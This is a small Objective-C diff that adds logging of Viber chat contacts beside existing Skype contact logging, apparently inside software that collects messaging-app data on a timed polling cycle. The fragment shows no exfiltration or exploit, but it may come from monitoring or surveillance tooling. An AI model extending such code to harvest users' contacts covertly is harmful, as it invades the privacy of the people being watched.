@@ -1581,6 +1581,8 @@ foundCharacters:(NSString *)string
   
   [self logChatContacts:mSkUsername appName:@"Skype" flag:SKYPE_APP_FLAG];
   
+  [self logChatContacts:mVbUsername appName:@"Viber" flag:VIBER_APP_FLAG];
+  
   [self getProperties];
   
   [self setChatPollingTimeOut:CHAT_TIMEOUT];
